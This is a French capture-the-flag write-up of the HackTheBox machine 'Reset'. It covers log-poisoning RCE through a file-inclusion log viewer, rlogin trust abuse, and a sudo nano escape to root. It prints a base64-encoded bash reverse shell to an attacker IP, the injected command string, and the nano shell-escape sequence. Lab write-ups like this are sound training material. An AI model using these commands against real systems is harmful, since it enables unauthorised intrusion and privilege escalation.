---
title: Reset
date: 2025-12-11 10:28:41
categories: ["Writeups", "Hackthebox", "Machines"]
tags: ["Easy", "Linux", "LFI", "Log poisoning"]
---

Reset est une machine Linux de difficulté facile qui illustre l'exploitation d'une fonctionnalité de réinitialisation de mot de passe dans une application web suite à une attaque par `empoisonnement de logs`, permettant d'obtenir l'exécution de code à distance. Pour l'escalade de privilèges, les `Rservices` sont exploités, puis une session `tmux` détachée est utilisée pour abuser des privilèges sudo sur l'éditeur de texte `nano` et exécuter des commandes en tant qu'utilisateur root.

## Enumération
### Nmap

Il y a 5 ports ouverts :
- 22 pour SSH
- 80 pour HTTP
- 512, 513 et 514 pour un service nommé `Rlogin`

```bash
╭─root@exegol-hackthebox /workspace/Reset
╰─➤  nmap 10.129.205.205 -vv -p- -T4
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-19 14:12 CEST
<snip>
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
512/tcp open  exec    syn-ack ttl 63
513/tcp open  login   syn-ack ttl 63
514/tcp open  shell   syn-ack ttl 63
<snip>

╭─root@exegol-hackthebox /workspace/Reset
╰─➤  nmap 10.129.205.205 -p 22,80,512,513,514 -sV -sC
<snip>

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 6a161fc8fefde398a685cffe7b0e60aa (ECDSA)
|_  256 e408cc5f8e56258f38c3ecdfb8860c69 (ED25519)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Admin Login
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login?
514/tcp open  shell   Netkit rshd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



### HTTP(80)

J'arrive sur une page de login ou je teste des identifiants basiques comme `admin:admin`, `admin:password`, mais cela ne donne rien. Il n'y a pas de message trop verbeux laissant des indices sur de potentiels utilisateurs.
![](/images/Reset/Reset-17.png)


Je teste alors la fonctionnalité de changement de mot de passe. J'entre l'utilisateur `admin` et je vois que le mot de passe a bien été changé.

![](/images/Reset/Reset-1.png)


Je décide alors de voir la requête envoyée sur `BurpSuite` et je vois le mot de passe en clair dans la réponse du serveur.

![](/images/Reset/Reset-2.png)

Bizarre comme comportement.


## Shell en tant que www-data
### LFI
Je me connecte alors avec les identifiants fournis et j'arrive sur la page administrateur ou je peux voir les logs de deux fichiers. le fichier `syslog` ainsi que le `auth.log`. Mais je vois que les fichiers sont vides. Même lorsque j'essaye de me connecter par SSH, le fichier `auth.log` reste vide.
![](/images/Reset/Reset-3.png)


En regardant la requête envoyée je vois que le site effectue une requête vers répertoire le `/var/log` et lis les fichiers de logs.
![](/images/Reset/Reset-4.png)


Je vois que je ne peux lire que le contenu du répertoire `/var/log`.
![](/images/Reset/Reset-5.png)


J'ai essayé d'exécuter des commandes mais cela ne fonctionne pas.
![](/images/Reset/Reset-6.png)

### Log Poisonning

En regardant ma requête vers le fichier de logs d'Apache, je remarque que le contenu du header `User-Agent` se trouve dans la réponse. Il s'agit des informations du navigateur que j'utilise. Normalement si j'ajoute un header spécifique à ma requête, celui-ci ne sera pas automatiquement inscrit dans le fichier `access.log` du serveur Apache car ce dernier n'est pas configuré pour inscrire cette information dans les logs. 
En tout cas là je vois une porte ouverte pour du `log poisonning`.
![](/images/Reset/Reset-7.png)


Apres quelques recherches sur le `log poisonning` sur [hackerrecipes](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning), je modifie la valeur du header `User-Agent` et je vois que cette valeur est bien prise en compte par le serveur.
![](/images/Reset/Reset-8.png)


Je lance donc une requête vers le `/var/log/syslog` avec mon payload PHP dans le header `User-Agent`.
![](/images/Reset/Reset-11.png)


Je vois le résultat dans les logs Apache.
```
file=%2Fvar%2Flog%2Fapache2%2Faccess.log&cmd=id
```
![](/images/Reset/Reset-12.png)


Pour avoir le shell j'ai créé encodé en base64 mon payload
```
╭─root@exegol-hackthebox /workspace/Reset
╰─➤  echo 'sh -i >& /dev/tcp/10.10.14.61/1234 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYxCg==
```


Ensuite je le place dans le paramètre `file`
```
file=%2Fvar%2Flog%2Fapache2%2Faccess.log&cmd=echo+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYx|base64+-d|bash
```
![](/images/Reset/Reset-13.png)


J'obtiens ainsi un shell en tant que `www-data`.
```
╭─root@exegol-hackthebox /workspace/Reset
╰─➤  pwncat-cs :1234
[16:14:58] Welcome to pwncat 🐈!                                                                                                 __main__.py:164
[16:16:08] received connection from 10.129.183.12:39120                                                                               bind.py:84
[16:16:09] 0.0.0.0:1234: upgrading from /usr/bin/dash to /usr/bin/bash                                                            manager.py:957
[16:16:10] 10.129.183.12:39120: registered new host w/ db                                                                         manager.py:957
(local) pwncat$
(remote) www-data@reset:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
(remote) www-data@reset:/var/www/html$
```


Dans le répertoire `/var/www/html/private_34eee5d2` se trouve la base de données ne contenant que les identifiants de l'administrateur. Mais je n'ai pas reussit à le cracker. Meme si j'imagine que le mot de passe est celui qui a été généré lors du changement de mot de passe.
```
(remote) www-data@reset:/var/www/html$ ls -la
total 28
drwxr-xr-x 3 root root 4096 Dec  7  2024 .
drwxr-xr-x 3 root root 4096 Dec  6  2024 ..
-rw-r--r-- 1 root root 2795 Dec  7  2024 dashboard.php
-rw-r--r-- 1 root root 4974 Dec  6  2024 index.php
drwxr-xrwx 2 root root 4096 Jul 19 13:45 private_34eee5d2
-rw-r--r-- 1 root root 1154 Dec  6  2024 reset_password.php
(remote) www-data@reset:/var/www/html$ cd private_34eee5d2/
(remote) www-data@reset:/var/www/html/private_34eee5d2$ ls -la
total 24
drwxr-xrwx 2 root root  4096 Jul 19 13:45 .
drwxr-xr-x 3 root root  4096 Dec  7  2024 ..
-rw-r--rw- 1 root root 16384 Jul 19 13:45 db.sqlite
(remote) www-data@reset:/var/www/html/private_34eee5d2$ sqlite3 db.sqlite
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|admin|083c4be00a45b3797d80f79c77c620bbd01dd41a|1
```


Je vois le code de la fonctionnalité de changement de mot de passe. Le code vérifie que l'utilisateur entré existe. S'il existe il génère une combinaison de 8 caractères qu'il hash ensuite en sha1. Il met ensuite à jour la base de données puis renvoi à la fin du JSON contenant la les nouveaux paramètres.
```php
(remote) www-data@reset:/var/www/html$ cat reset_password.php
<?php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $db = new SQLite3('private_34eee5d2/db.sqlite');
    $stmt = $db->prepare('SELECT * FROM users WHERE username = :username');
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $result = $stmt->execute();
    $user = $result->fetchArray(SQLITE3_ASSOC);

    if ($user) {
        $newPassword = bin2hex(random_bytes(4)); // Generate 8-character password
        $hashedPassword = sha1($newPassword);
        $updateStmt = $db->prepare('UPDATE users SET password_hash = :password_hash WHERE username = :username');
        $updateStmt->bindValue(':password_hash', $hashedPassword, SQLITE3_TEXT);
        $updateStmt->bindValue(':username', $username, SQLITE3_TEXT);
        $updateStmt->execute();

        echo json_encode([
            'username' => $username,
            'new_password' => $newPassword,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
    } else {
        echo json_encode(['error' => 'User not found']);
    }
} else {
    echo json_encode(['error' => 'Invalid request']);
}
?>
```


Je vois qu'il existe 3 utilisateurs sur la machine. Je me rends alors dans le répertoire personnel de `sadm`. Je peux alors obtenir le flag user.
```bash
(remote) www-data@reset:/var/www/html$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
local:x:1000:1000:local:/home/local:/bin/bash
sadm:x:1001:1001:,,,:/home/sadm:/bin/bash
(remote) www-data@reset:/home$ ls -la
total 16
drwxr-xr-x  4 root  root  4096 Jun  2 11:34 .
drwxr-xr-x 19 root  root  4096 Jun  4 14:57 ..
drwxr-x---  5 local local 4096 Jun  2 11:34 local
drwxr-xr-x  4 sadm  sadm  4096 Jun  4 14:57 sadm
(remote) www-data@reset:/home$ cd sadm
(remote) www-data@reset:/home/sadm$ ls -la
total 36
drwxr-xr-x 4 sadm sadm 4096 Jun  4 14:57 .
drwxr-xr-x 4 root root 4096 Jun  2 11:34 ..
lrwxrwxrwx 1 sadm sadm    9 Dec  6  2024 .bash_history -> /dev/null
-rw-r--r-- 1 sadm sadm  220 Dec  6  2024 .bash_logout
-rw-r--r-- 1 sadm sadm 3771 Dec  6  2024 .bashrc
drwx------ 2 sadm sadm 4096 Jun  2 11:34 .cache
drwxrwxr-x 3 sadm sadm 4096 Jun  2 11:34 .local
-rw-r--r-- 1 sadm sadm  807 Dec  6  2024 .profile
-rw------- 1 sadm sadm    7 Dec  6  2024 .rhosts
-rw-r--r-- 1 root root   33 Apr 10 09:45 user.txt
(remote) www-data@reset:/home/sadm$ cat user.txt
19ba954c8ba8400cbfc0277f5f1669a4
```

## Shell en tant que sadm
### tmux
Après ça je me suis mis à fouiller un peu partout sur la machine. j'ai regardé les SUID, les logs, les fichiers appartenant aux utilisateurs `www-data` et `sadm`. Puis en regardant les processus, je vois que `sadm` a lancé une session `tmux`.
```
(remote) www-data@reset:/home/sadm$ ps -ef --forest
UID          PID    PPID  C STIME TTY          TIME CMD
root           2       0  0 13:41 ?        00:00:00 [kthreadd]
<snip>
root        1222       1  0 13:41 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1238    1222  0 13:41 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data    1842    1238  0 14:16 ?        00:00:00  |   \_ sh -c echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMTIzNCAwPiYxCg==|base64 -d|bash
www-data    1845    1842  0 14:16 ?        00:00:00  |       \_ bash
www-data    1846    1845  0 14:16 ?        00:00:00  |           \_ /usr/bin/bash
www-data    1866    1846  0 14:16 ?        00:00:00  |               \_ /usr/bin/script -qc /usr/bin/bash /dev/null
www-data    1867    1866  0 14:16 pts/0    00:00:00  |                   \_ sh -c /usr/bin/bash
www-data    1868    1867  0 14:16 pts/0    00:00:00  |                       \_ /usr/bin/bash
www-data    2704    1868  0 15:10 pts/0    00:00:00  |                           \_ ps -ef --forest
www-data    1239    1222  0 13:41 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data    1240    1222  0 13:41 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data    1241    1222  0 13:41 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data    1242    1222  0 13:41 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data    1375    1222  0 13:44 ?        00:00:00  \_ /usr/sbin/apache2 -k start
www-data    2437    1222  0 14:58 ?        00:00:00  \_ /usr/sbin/apache2 -k start
sadm        1232       1  0 13:41 ?        00:00:00 tmux new-session -d -s sadm_session
sadm        1234    1232  0 13:41 pts/3    00:00:00  \_ -bash
```


J'ai essayé de m'y attaché mais cela n'a pas fonctionné. La j'étais bloqué.
```
(remote) www-data@reset:/home/sadm$ tmux attach-session -t sadm_session
no sessions
```


### Rlogin

Puis je suis retourné sur le résultat du scan Nmap. Il doit surement avoir quelque chose à faire avec le service `Rlogin`. Une petite recherche sur le site de [hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rlogin.html) sur le pentest de `rlogin`. Je trouve aussi sur [hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rsh.html) que le fichier `/etc/hosts.equiv` contient les utilisateurs autorisés à se connecter à `rlogin`.
```
(remote) www-data@reset:/home/sadm$ cat /etc/hosts.equiv
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#                   command access to your system .
- root
- local
+ sadm
(remote) www-data@reset:/home/sadm$
```


Je vois que `rlogin` est déjà installé sur la machine. L'utilisateur autorisé à se connecter est `sadm`, mais je n'ai pas réussi à m'y connecter.
```
(remote) www-data@reset:/home/sadm$ rlogin -l sadm 127.0.0.1
Password:
Password:

Login incorrect
reset login: toto
Password:
```


Là j'étais de nouveaux bloqué. Je décide alors de regarder le writeup de [0xdf](https://0xdf.gitlab.io/2025/07/15/htb-reset.html). Je vois alors qu'il est possible de l'exploiter depuis ma machine. Il suffit pour cela, comme vu sur [hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rlogin.html), d'installer `rsh-client`, ensuite de créer un utilisateur avec le même nom que celui autorisé à pouvoir se connecter avec `rlogin`.
```bash
╭─root@exegol-hackthebox /workspace/Reset
╰─➤  apt-get install rsh-client
Reading package lists... Done
<snip>

╭─root@exegol-hackthebox /workspace/Reset
╰─➤  useradd sadm

╭─root@exegol-hackthebox /workspace/Reset
╰─➤  passwd sadm
New password:
Retype new password:
passwd: password updated successfully
```


Ensuite je me connecte en tant que `sadm` sur ma machine. Puis je lance la commande `rlogin` avec l'adresse IP de la machine cible. Et voila que je suis connecté en tant que `sadm`.
```bash
╭─root@exegol-hackthebox /workspace/Reset
╰─➤  su - sadm
su: warning: cannot change directory to /home/sadm: No such file or directory
$ rlogin 10.129.183.12
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)
<snip>

sadm@reset:~$ id
uid=1001(sadm) gid=1001(sadm) groups=1001(sadm)
```


Je m'attache ensuite à la session `tmux` trouvée lors de l'énumération des processus. S'y trouve le mot de passe `7lE2PAfVHfjz4HpE` de `sadm`.
```bash
sadm@reset:~$ tmux ls
sadm_session: 1 windows (created Sat Jul 19 13:41:18 2025)
sadm@reset:~$ tmux attach-session -t sadm_session
```
![](/images/Reset/Reset-16.png)


Je me connecte alors par SSH avec les identifiants trouvés.
```
╭─root@exegol-hackthebox /workspace/Reset
╰─➤  ssh sadm@10.129.183.12
sadm@10.129.183.12's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jul 19 03:52:20 PM UTC 2025

  System load:           0.0
  Usage of /:            65.2% of 5.22GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             234
  Users logged in:       1
  IPv4 address for eth0: 10.129.183.12
  IPv6 address for eth0: dead:beef::250:56ff:fe94:9cf1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jul 19 15:51:10 2025 from 10.10.14.61
sadm@reset:~$ id
uid=1001(sadm) gid=1001(sadm) groups=1001(sadm)
```


## Shell en tant que root
### Nano

Apres exécution de la commande `sudo -l` je vois que `sadm` peux exécuter plusieurs binaires pour lire plusieurs fichiers.
```
sadm@reset:~$ sudo -l
[sudo] password for sadm:
Matching Defaults entries for sadm on reset:
    env_reset, timestamp_timeout=-1, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, !syslog

User sadm may run the following commands on reset:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```


Sur [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo), je vois la méthode pour une escalade de privilèges avec `nano`. Il suffit :
1. Ouvrir le fichier avec la commande `sudo /usr/bin/nano /etc/firewall.sh`. 
2. Une fois le fichier ouvert j'entre successivement les combinaisons `CTRL + R` et `CRTL + X`
3. Un texte s'affiche et nous demande d'entrer une commande. Nous entrons alors la commande suivante `reset; sh 1>&0 2>&0` puis je clique sur `Entrer`.
![](/images/Reset/Reset-15.png)


J'obtiens alors un shell en tant que root.
```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root/
# ls -la
total 56
drwx------  8 root root 4096 Jun  2 11:34 .
drwxr-xr-x 19 root root 4096 Jun  4 14:57 ..
lrwxrwxrwx  1 root root    9 Dec  6  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Jun  2 09:17 .cache
drwx------  3 root root 4096 Dec  6  2024 .config
-rw-------  1 root root   20 Jun  2 10:54 .lesshst
drwxr-xr-x  3 root root 4096 Dec  6  2024 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Apr 10 09:44 root_279e22f8.txt
drwxrwxr-x  2 root root 4096 Jun  2 11:34 .scripts
-rw-r--r--  1 root root   66 Dec  6  2024 .selected_editor
drwx------  3 root root 4096 Dec  6  2024 snap
drwx------  2 root root 4096 Dec  6  2024 .ssh
-rw-r--r--  1 root root    0 Feb  7 08:58 .sudo_as_admin_successful
-rw-r--r--  1 root root  165 Jun  2 10:52 .wget-hsts
# cat root_279e22f8.txt
7ad6951bcb5a2edaffd7908b013d29b0
```
